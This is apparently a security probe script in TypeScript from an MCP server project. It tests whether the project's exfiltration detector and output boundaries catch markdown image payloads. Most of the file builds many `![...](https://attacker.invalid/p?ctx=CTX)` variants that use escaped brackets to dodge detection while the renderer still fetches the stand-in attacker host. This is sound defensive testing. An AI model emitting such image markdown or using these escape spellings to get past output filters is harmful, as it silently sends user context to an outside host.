// T85 — differential against the renderer for the description-side escape class
// (T84#F-003), over spellings no prior round wrote, driven through the shipped
// detector and all four public boundaries.
//
// The question is the one this flow always asks: is there a document `marked`
// fetches an attacker host for while some boundary still carries that host?
// Everything else is recorded and is not a bypass.
//
// Two populations:
//   - the spellings this round's regression pins, so the test's premise («marked
//     renders an <img> for each of these») is measured rather than assumed;
//   - a generated sweep over every position a backslash-escaped `]` can sit in a
//     description, crossed with the four destination spellings and the four use
//     forms, so the class is enumerated rather than sampled.
//
// Read-only, offline, synthetic and reserved hosts only.
// Usage: bun T85-marked.ts
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";
import { detectExfil } from "../../../../src/security/detect/exfil";
import { marked } from "marked";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const OK = "https://ok.example.org/x";

const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

const shapes: Record<string, string> = {
  // --- the spellings this round's regression pins --------------------------
  b01FullRefEscapedAlt: `![a\\]][b]\n\n[b]: ${U}\n`,
  b02FullRefEscapedAltTwice: `![a\\]b\\]][b]\n\n[b]: ${U}\n`,
  b03FullRefLeadingEscape: `![\\]][b]\n\n[b]: ${U}\n`,
  b05FullRefEscapedAltEscapedRef: `![a\\]][b\\]]\n\n[b\\]]: ${U}\n`,
  b07InlineEscapedAlt: `![a\\]](${U})\n`,
  b08InlineEscapedAltAngle: `![a\\]](<${U}>)\n`,
  m01NestedBalancedEscapedClose: `![a[b]\\]c](${U})\n`,
  m02NestedBalancedEscapedCloseAngle: `![a[b]\\]c](<${U}>)\n`,
  m03EscapedCloseInLinkTextWithImage: `[t\\]x![i](${U})](https://ok.example.org/h)\n`,
  m04EscapedBackslashThenEscapedClose: `![a\\\\\\]](${U})\n`,
  m06FullRefEscapedAltAdjacent: `![a\\]][b]![c](${U})\n\n[b]: ${OK}\n`,
  m07EscapedCloseAdjacentToReal: `![ab\\]](${U})\n`,

  // --- the no-release shapes, recorded on the same run ----------------------
  // `exfil.ts:529-531`'s own shape: no image is rendered, and it is flagged.
  z01EscapedCloseNoImage: `![a\\](${U})\n`,
  z02EscapedCloseNoImageAngle: `![a\\](<${U}>)\n`,
  // the spurious-link shape the parity fuzz found: a new candidate end must not
  // let the first line's destination grammar swallow the second line's image.
  z03SpuriousLinkSwallow: `a[[a\\]\\\\]: (${U})()](\n![bc\\](<${U}>)`,
  // controls
  z90PlainInline: `![a](${U})\n`,
  z91BalancedDescription: `![a[b]c](${U})\n`,
  z92ReferenceLinkClickGated: `[a\\]][b]\n\n[b]: ${U}\n`,
};

// --- generated sweep -------------------------------------------------------
// every position an escaped `]` can sit in a description, x destination
// spelling, x use form.
const DESCRIPTIONS: Record<string, string> = {
  leading: "\\]ab",
  middle: "a\\]b",
  trailing: "ab\\]",
  doubled: "a\\]b\\]c",
  nested: "a[b]\\]c",
  nestedDeep: "a[b[c]d]\\]e",
  escapedBackslashThenEscape: "a\\\\\\]b",
  escapedOpenAndClose: "a\\[b\\]c",
  onlyEscape: "\\]",
  withSpaces: "a \\] b",
};
const USES: Record<string, (d: string) => string> = {
  inline: (d) => `![${d}](${U})\n`,
  inlineAngle: (d) => `![${d}](<${U}>)\n`,
  fullRef: (d) => `![${d}][r]\n\n[r]: ${U}\n`,
  collapsed: (d) => `![${d}][]\n\n[${d}]: ${U}\n`,
  shortcut: (d) => `![${d}]\n\n[${d}]: ${U}\n`,
  imageInLink: (d) => `[${d}![i](${U})](${OK})\n`,
};
for (const [dName, description] of Object.entries(DESCRIPTIONS)) {
  for (const [uName, build] of Object.entries(USES)) {
    shapes[`g_${dName}_${uName}`] = build(description);
  }
}

const cwd = process.cwd();
const ctx: McpContext = {
  cwd,
  config: mergeMcpConfig({ redactToolOutput: false }),
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: Object.entries(shapes).map(([name, text]) => ({
    name: `p.${name}`,
    module: "standard" as const,
    description: name,
    inputSchema: { type: "object" },
    mutating: false,
    invoke: async () => ({ note: text }),
  })),
};

function rendererImgSrcs(md: string): string[] {
  const html = marked.parse(md, { async: false }) as string;
  return [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/g)].map((m) => m[1] as string);
}

const rows: Array<Record<string, unknown>> = [];
for (const [name, text] of Object.entries(shapes)) {
  const serialized = JSON.stringify({ note: text });
  const call = await dispatchCallTool(ctx, `p.${name}`, {});
  const persisted = prepareOutputForPersistence(pass, serialized);
  const transported = validateOutputForTransport({ value: { note: text }, format: "json" });
  const seamText = await redactToolOutput(cwd, serialized);
  const imgs = rendererImgSrcs(text);
  const rendererFetchesAttacker = imgs.some((s) => s.includes(ATT));
  const boundaries = {
    mcp: JSON.stringify(call).includes(ATT),
    persist: persisted.allowed ? persisted.content.includes(ATT) : false,
    transport: transported.text.includes(ATT),
    seam: seamText.includes(ATT),
  };
  rows.push({
    id: name,
    rendererFetches: imgs,
    rendererFetchesAttacker,
    detectorFindings: detectExfil(text, []).length,
    mcpState: (call as { redaction?: { state?: string } }).redaction?.state ?? "?",
    boundaries,
    leaksAtAnyBoundary: Object.values(boundaries).some(Boolean),
    verdict:
      rendererFetchesAttacker && Object.values(boundaries).some(Boolean)
        ? "BYPASS"
        : "closed",
  });
}

console.log(
  JSON.stringify(
    {
      probe: "T85-marked",
      shapes: rows.length,
      rows,
      bypasses: rows.filter((r) => r.verdict === "BYPASS").map((r) => r.id),
      rendererFetchesButNoFinding: rows
        .filter((r) => r.rendererFetchesAttacker && r.detectorFindings === 0)
        .map((r) => r.id),
      findingWithoutRendererFetch: rows
        .filter((r) => !r.rendererFetchesAttacker && (r.detectorFindings as number) > 0)
        .map((r) => r.id),
    },
    null,
    2,
  ),
);
